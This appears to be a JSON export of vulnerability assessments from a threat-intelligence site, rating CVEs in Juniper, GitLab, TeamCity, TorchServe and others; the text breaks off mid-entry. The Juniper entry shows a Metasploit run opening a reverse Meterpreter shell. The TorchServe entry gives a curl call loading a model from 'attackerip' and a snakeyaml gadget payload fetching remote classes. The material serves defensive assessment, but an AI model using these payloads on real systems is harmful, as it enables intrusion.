          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5a88f7d9-cdf4-4cbc-8015-0998a2cc2535",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "70e3869b-b2b6-4d39-89a4-2efdbae3bee2",
      "created": "2023-09-13T21:35:11.931566Z",
      "revisionDate": "2023-09-15T13:12:31.188686Z",
      "document": "This was released in an advisory with 15 different vulnerabilities! I chained together 4 of them (or 5, depending on how you count) to get RCE. Weaponizing was tricky due to aggressive filters, but we figured out how to execute any arbitrary command with encoding on both Windows and Linux.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "261c9d8e-0841-4ceb-916c-7294a061a188",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "5e9429e0-21b2-448f-8137-a7fde1ea5c48",
      "created": "2023-09-18T21:36:50.111798Z",
      "revisionDate": "2023-09-18T21:36:50.110015Z",
      "document": "Added to CISA KEV [on Sept. 18, 2023](https://www.cisa.gov/news-events/alerts/2023/09/18/cisa-adds-eight-known-exploited-vulnerabilities-catalog), but exploited for at least the past [two years](https://isc.sans.edu/diary/Laravel+v842+exploit+attempts+for+CVE20213129+debug+mode+Remote+code+execution/27758). Vuln only affects sites with debug mode enabled, which are evidently more common than one perhaps would've thought. In any event, it's a two-plus-year-old vuln \u2014 please patch it.",
      "score": 1,
      "metadata": {
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "78840f9f-d6e2-4693-aab8-b0d4cfd5f1e8",
      "editorId": "f9b15853-20c7-4441-8e02-740190c03746",
      "topicId": "ce100cf8-e431-4215-88f0-e0eb35aa336b",
      "created": "2023-09-19T06:08:15.76945Z",
      "revisionDate": "2023-09-19T06:08:15.768539Z",
      "document": "tired of chrome being hacked, I have a google drive by exploit forcing phony OS and cant get to the bottom of it, hope this is it ",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Command and Control"
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5ae7d6c6-51d4-452a-889c-5da521d59118",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "1f73040e-99b9-4b2a-9cb2-cc4396338a3a",
      "created": "2023-09-21T17:02:12.047974Z",
      "revisionDate": "2023-12-20T10:30:13.772332Z",
      "document": "This might be the most impactful CVSSv3 5.3 rated vulnerability you\u2019ve ever (or never) heard about. The vulnerability affects Juniper\u2019s SRX Firewalls and EX Switches and allows unauthenticated attackers to change environment variables resulting in remote code execution as the `nobody` user. I\u2019m going to briefly go over the evolution of the research of this vulnerability as I found it interesting. \r\n\r\n## CVE-2023-36844 + CVE-2023-36845\r\n\r\nThe Juniper advisory was first analyzed by Sonny at watchtowr and they wrote a great [blog](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) outlining how they used this vulnerability along with CVE-2023-36844 in order to obtain RCE. CVE-2023-36844 is an arbitrary file upload function that exploits the `do_upload` function within the affected device. So what Sonny did was:\r\n\r\n1) Use CVE-2023-36844 to upload a PHP file containing our shellcode\r\n\r\n2) Use CVE-2023-36844 again to upload a second file, containing an auto_prepend_file directive instructing the PHP preprocessor to execute the file we uploaded in step 1\r\n\r\n3) Use bug CVE-2023-36845 to set the PHPRC variable to the file we uploaded in step 2.\r\n\r\n## Just CVE-2023-36845\r\nUsing the clever research published by Sonny, Jacob Baines from Vuln Check posted a [blog](https://vulncheck.com/blog/juniper-cve-2023-36845)  outlining how RCE can be obtained solely using CVE-2023-36845. \r\n\r\nThe affected Juniper devices use Appweb web server and when Appweb invokes a CGI script it passes arguments and environment variables in order for the script to access the users\u2019s HTTP request. The body of the HTTP request is passed using stdin. Jacob noted that every FreeBSD process has access to their stdin by opening `/dev/fd/0`.  So by  sending an HTTP request, an attacker is able to introduce a \u201cfile\u201d, `/dev/fd/0` to the system.\r\n\r\nSo if the attacker set\u2019s `PHPRC` equal to `/dev/fd/0` and then uses the PHP function `auto_prepend_file` which causes the provided file to be added using the `require` function, in combination with `allow_url_include` which allows the use of URL-aware `fopen` wrappers. The attacker can then set `auto_prepend_file` equal to `data://<payload_goes_here>` so that the payload is provided inline and gets executed without ever being written to disk. Very cool. \r\n\r\n## Try this at home\r\n\r\nThere's a great metasploit module available for this that can be found [here](https://github.com/rapid7/metasploit-framework/pull/18389) and can be run like so:  \r\n```\r\nmsf6 exploit(freebsd/http/junos_phprc_auto_prepend_file) > set rhosts 192.168.0.247\r\nrhosts => 192.168.0.247\r\nmsf6 exploit(freebsd/http/junos_phprc_auto_prepend_file) > set lhost 192.168.0.77\r\nlhost => 192.168.0.77\r\nmsf6 exploit(freebsd/http/junos_phprc_auto_prepend_file) > run\r\n\r\n[*] Started reverse TCP handler on 192.168.0.77:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target appears to be vulnerable. Environment variable manipulation succeeded indicating this target is vulnerable.\r\n[*] Sending stage (39927 bytes) to 192.168.0.247\r\n[*] Meterpreter session 4 opened (192.168.0.77:4444 -> 192.168.0.247:58995) at 2023-09-20 16:27:04 -0400\r\n\r\nmeterpreter > getuid\r\nServer username: nobody\r\nmeterpreter > sysinfoi\r\n[-] Unknown command: sysinfoi\r\nmeterpreter > sysinfo\r\nComputer    : JUNOS\r\nOS          : FreeBSD JUNOS JNPR-11.0-20200608.0016468_buil FreeBSD JNPR-11.0-20200608.0016468_builder_stable_11 #0 r356482+0016468ed6c(stable/11): Sun Jun  7 23:59:18 PDT 2020     builder@feyrith.juniper.net:/volume/build/junos/occam/llvm-5.0/sandbox-20200605/freebsd/\r\nMeterpreter : php/freebsd\r\nmeterpreter >\r\n```\r\n\r\n## References\r\nhttps://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/\r\nhttps://vulncheck.com/blog/juniper-cve-2023-36845",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "160d023e-0dc8-4570-9b68-04eed30af708",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "0b2dea82-5ac6-4d26-ac77-81a86ffe9f73",
      "created": "2023-09-21T22:12:32.76651Z",
      "revisionDate": "2023-10-25T19:19:53.89021Z",
      "document": "The work done by [watchTowr](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) and later [VulnCheck](https://vulncheck.com/blog/juniper-cve-2023-36845) is super cool, and outlines different great ways to exploit the vulnerability (we based the Rapid7 Analysis on watchTowr's). Neither of them mention something sorta-important: all the known exploits land you in a super-restrictive BSD jail with no meaningful OS access.\r\n\r\nThe application running in the jail has access to configure the system, so presumably there's a path from the jail to the OS, but to my knowledge nobody has done much yet. In our analysis, we showed how you could steal an admin session then change the system's password, but surely there are better avenues waiting to be found!",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "b5e077df-f64b-45bc-933d-5d138f4a7171",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "022a843e-1d2c-46f1-92b2-2a6548c8e49b",
      "created": "2023-09-22T17:10:04.787887Z",
      "revisionDate": "2023-09-23T17:56:09.029547Z",
      "document": "On September 18, 2023, [GitLab released an advisory](https://about.gitlab.com/releases/2023/09/18/security-release-gitlab-16-3-4-released/) for [CVE-2023-5009](https://nvd.nist.gov/vuln/detail/CVE-2023-5009), a vulnerability that affects GitLab Enterprise Edition (EE) from versions 13.12 and before 16.2.7, and also from versions 16.3 and before 16.3.4. Notably version 13.12 was released May 22, 2021, which means this vulnerability has been present in the code base for 2 years and 4 months. The open source commit that fixes the issue can be [found here](https://gitlab.com/gitlab-org/gitlab/-/commit/afdfccd21e744b276e786cd5ee49357a33de2b6c?view=inline).\r\n\r\nCVE-2023-5009 is described as a bypass of CVE-2023-3932 which was patched two months prior. Both issues allow an attacker, who is authenticated as a user on a GitLab EE server, to run [pipelines](https://docs.gitlab.com/ee/ci/pipelines/) under the context of another arbitrary user on the same GitLab instance. The impact of doing this would allow an attacker to access resources, such as private source code or other secrets, owned by a target user. \r\n\r\nPipelines allow GitLab to perform Continuous Integration (CI) and Continuous Delivery (CD). Pipelines define the work to perform and this work is then executed by [Runners](https://docs.gitlab.com/ee/ci/runners/index.html). A [detailed walkthrough](https://gitlab.com/gitlab-org/gitlab/-/issues/417594) of how to exploit the original issue CVE-2023-3932 is available, and shows how an attacker can create a malicious self hosted runner that is capable of accessing private data from a target user. \r\n\r\nOf note is how, according to the advisory, the new bypass CVE-2023-5009 requires two features in GitLab EE to be enabled, specifically:\r\n\r\n* Security Policies\r\n* Direct Transfers\r\n\r\n\"Security Policies\" require an Ultimate edition license of GitLab EE and are enabled by default. They define how scans are performed when a pipeline job runs.\r\n\r\nWhen enabled, the \"Direct Transfers\" feature allows a user to transfer ownership of a project to another user. When testing a vulnerable GitLab EE server version 16.3.3, it was noted that the \"Direct Transfers\" feature was disabled by default. An admin user must enable this feature for it to be available to other users. It is likely that this non default requirement will reduce the amount of impacted servers. In addition the attacker must have authenticated access to an account on a vulnerable server. While some GitLab instances allow new users to sign up ([and by default this is allowed](https://docs.gitlab.com/ee/administration/settings/sign_up_restrictions.html)), this may not be possible in all cases when the GitLab admin has disabled new user signups.\r\n\r\nBased on this, the attacker value for this vulnerability is high as it allows for the discovery of private data, however the exploitability is lower as not all vulnerable instances of GitLab EE will be configured to enable \"Direct Transfers\", nor will an attacker have a valid user account on the server. This will limit the ability for attackers to exploit this vulnerability broadly, however targeted attacks are more likely.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "a76198fe-1ed2-4893-b28a-994dbe003c4b",
      "editorId": "25106ab9-2514-4358-9c90-3f04733bb8fc",
      "topicId": "f7237ad5-983b-4f7a-8847-0b491ff56945",
      "created": "2023-09-23T19:06:20.326436Z",
      "revisionDate": "2023-09-23T19:06:20.327275Z",
      "document": "Based on the published vulnerability [details](https://blog.silentsignal.eu/2023/07/03/ibm-i-dde-vulnerability-cve-2023-30990/) authentication bypass is possible likely because the DDM service fails to terminate the session as an authentication error is detected, but proceeds to parse subsequent commands incoming from the connection. The commands sent by the attacking client can include instructions for command execution, making this an unauthenticated RCE. ",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access"
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "cf05ec71-2f73-4b2d-a6f0-04f0b1203005",
      "editorId": "25106ab9-2514-4358-9c90-3f04733bb8fc",
      "topicId": "653441be-b111-40f0-882f-e0d2f072af3a",
      "created": "2023-09-23T19:15:37.120466Z",
      "revisionDate": "2023-09-24T20:36:33.23522Z",
      "document": "Based on the published [details](https://blog.silentsignal.eu/2023/08/22/2023-08-22-Facsimile-Support-CVE-2023-30988/) the vulnerable program object executes with \\*OWNER privileges (similarly to how SUID executables work), but use the Library List (similar to the PATH environment variable) of the executing user, who can thus replace program dependencies to make their code execute in the context of a different user profile. This other user profile (QAUTPROF) has authority to impersonate QFAXMSF (also installed as part of the vulnerable software package), that has *ALLOBJ (\"All Object\" - similar to uid=0) special authority on the system. This is a local privilege escalation from any user profile (with command line access) to complete control over the system.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation"
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "bc4f26cd-35ae-428b-949b-071e81ee9223",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "d682f60f-4477-44e8-9297-508d1e4a93a7",
      "created": "2023-09-27T13:47:46.872308Z",
      "revisionDate": "2023-09-27T14:16:13.477891Z",
      "document": "Based on the accompanying [Rapid7 Analysis](https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis), the attacker value for CVE-2023-42793 is very high given the target product is a CI/CD server, and as such may contain sanative information such as source code or signing keys, in addition to being a vector for conducting a supply chain attack. The exploitability for this vulnerability is also very high, as the product is vulnerable in a default configuration and an attacker can trivially exploit it with a sequence of cURL commands.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "de3c38e2-9fef-4ace-8ea9-21187f10a6f6",
      "editorId": "32e12314-f37d-4d08-8825-59a4034c8ab4",
      "topicId": "8f1f29d7-4408-4055-874a-19d8ef2b99e6",
      "created": "2023-09-27T19:33:00.949438Z",
      "revisionDate": "2023-09-27T19:33:00.947724Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "8ec55abb-8186-49de-a915-7441613721ff",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "806300a4-6445-4223-b146-99ca98323d05",
      "created": "2023-10-02T08:11:00.665362Z",
      "revisionDate": "2023-10-02T09:09:06.999382Z",
      "document": "Based on our [Rapid7 Analysis](https://attackerkb.com/topics/bn32f9sNax/cve-2023-40044/rapid7-analysis), the attacker value for this vulnerability is very high due to the target software being a file transfer solution. The exploitability rating for this vulnerability is also very high as it is trivially exploitable with a single HTTP(S) POST request by an unauthenticated attacker.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "da6eecfd-59fa-4c18-a0f8-4d9f15ffe0f7",
      "editorId": "38047d0b-ee12-4823-af3f-dbbd759fa225",
      "topicId": "396fb396-0479-4c86-bdb2-299aa1c27465",
      "created": "2023-10-04T12:49:35.355993Z",
      "revisionDate": "2023-10-04T12:49:35.35578Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": []
    },
    {
      "id": "cff9cdb0-00e4-4da2-9cc8-9d6215f5c267",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "8fe8c305-3ec3-4279-b07b-0f7b7135616f",
      "created": "2023-10-04T20:19:36.702876Z",
      "revisionDate": "2023-10-05T08:50:08.772273Z",
      "document": "Atlassian released an out-of-band update today that addresses a critical privilege escalation in Confluence Server and Data Center (on-prem only) that has evidently been exploited in a \"handful\" of customer environments \"to create unauthorized Confluence administrator accounts and access Confluence instances.\"  It's fairly rare for a privilege escalation to be considered critical, though not unprecedented (lookin' at you, Zerologon). It would be awfully helpful if there were more information about the root cause, since the bug is evidently remotely exploitable from the internet \u2014 also not exactly like your typical privilege escalation. Not sure if Atlassian is deliberately obfuscating that information or not. \r\n\r\nAdvisory has IOCs: https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html",
      "score": 2,
      "metadata": {},
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "a672604e-d812-4de0-9029-f2218232d3f3",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "dc6804ef-fcb9-4b4c-864e-c40a253bc6df",
      "created": "2023-10-06T17:51:06.487167Z",
      "revisionDate": "2023-10-06T18:14:10.211611Z",
      "document": "snakeyaml contains a vulnerability whereby an attacker that has control over YAML data that is deserialized by an affected version can execute arbitrary Java code. There are multiple, gadget chains that have been published for exploiting this vulnerability. In practice, this vulnerability is most valuable for exploitation purposes when chained with another vulnerability that allows for it to be triggered remotely such as [CVE-2023-43654](https://attackerkb.com/assessments/60b67f50-4cf8-4905-9586-8c5c0c73a026).\r\n\r\nThis vulnerability is moderately difficult to weaponize due to a couple of factors. First, in most scenarios, the attacker will need to understand the context in which snakeyaml is used within the host application. This will involve figuring out a means by which to get the target application to deserialize YAML data controlled by the attacker through some kind of API call, for example. Secondly, while multiple gadget chains are publicly available for, the exploit developer will still need to do some trial and error to find a chain that works within the target application. Once a chain has been identified, the target application will require access to communicate with an attacker-controlled server from which to load the Java class data. In the public chains, this server would either be HTTP(S) or LDAP.\r\n\r\nCode execution will occur in the context of the host application where the snakeyaml library is used. This means the payload will execute with the same privileges as the host application, which will be different on a case-by-case basis.\r\n\r\nThis vulnerability was fixed in version 2.0. See the issue on [bitbucket](https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in) for more information.",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "60b67f50-4cf8-4905-9586-8c5c0c73a026",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "89ee21fc-3fd3-4e70-bdc7-bd1ae3ebbf6d",
      "created": "2023-10-06T18:12:40.951772Z",
      "revisionDate": "2023-10-09T13:44:30.985563Z",
      "document": "TorchServer allows models to be registered from any HTTP server that the server can access. A remote, unauthenticated attacker can leverage this to register arbitrary model archives with the server using the [register-a-model](https://pytorch.org/serve/management_api.html#register-a-model) API.\r\n\r\nThis API can be invoked using cURL:\r\n\r\n```\r\ncurl --location --request POST 'http://localhost:8081/models?url=http%3A%2F%2Fattackerip%3A8000%2Fmalicious.mar'\r\n```\r\n\r\nIf the registration is successful, the model will need to be [unregistered](https://pytorch.org/serve/management_api.html#unregister-a-model) before it can be registered again.\r\n\r\nThis API can be invoked using cURL as well:\r\n\r\n```\r\ncurl --location --request DELETE 'http://localhost:8081/models/malicious/1.0'\r\n```\r\n\r\nTorchServer version 0.8.1 and previous are vulnerable. This vulnerability was patched in 0.8.2. A remote user can invoke the [api-description](https://pytorch.org/serve/management_api.html#api-description) endpoint to determine the target version.\r\n\r\n```\r\n[smcintyre@localhost ~]$ curl --location --request OPTIONS 'http://localhost:8081' | jq '.info'\r\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\r\n                                 Dload  Upload   Total   Spent    Left  Speed\r\n100 58576  100 58576    0     0  16.8M      0 --:--:-- --:--:-- --:--:-- 18.6M\r\n{\r\n  \"title\": \"TorchServe APIs\",\r\n  \"description\": \"TorchServe is a flexible and easy to use tool for serving deep learning models\",\r\n  \"version\": \"0.8.1\"\r\n}\r\n```\r\n\r\n# Exploitation With [CVE-2022-1471](https://attackerkb.com/assessments/a672604e-d812-4de0-9029-f2218232d3f3)\r\nThis vulnerability is notably more valuable when combined with CVE-2022-1471. In this case, the model archive (MAR file, `.mar`) can contain a YAML configuration file  that is capable of triggering remote code execution through a vulnerable version of the snakeyaml library. An attacker would construct the MAR file (which is a structured ZIP file) with a `MAR-INFO/MANIFEST.json` that references a configuration file through the `model.configFile` key. In the case of TorchServer 0.8.1, the `ScriptEngineManager` gadget chain is effective. The `ScriptEngineManager` has the advantage over other LDAP-based chains due to being HTTP-based. This means the TorchServer only needs to have access to one service from which it can retrieve the MAR file as well as the Java payload classes as opposed to requiring access to both an HTTP and LDAP service.\r\n\r\nThe serialized config file would look like the following where `$payload_url` is the URL to where the Java class files are stored.\r\n\r\n```\r\n!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"$payload_url\"]]]]\r\n```\r\n\r\nWhen using this chain it is also necessary to host a `services/javax.script.ScriptEngineFactory` file which contains the name of the payload class to load. When using this gadget chain, the payload class must implement `javax.script.ScriptEngineFactory`. See [SnakeYaml Deserilization exploited (2019)](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) for more information.\r\n\r\nThe `ResourceGadget`, `C3P0WrapperConnPool` and `BadAttributeValueExpException` gadget chains do not work against TorchServer 0.8.1, making the `ScriptEngineManager` chain the only HTTP-based one to work from [this 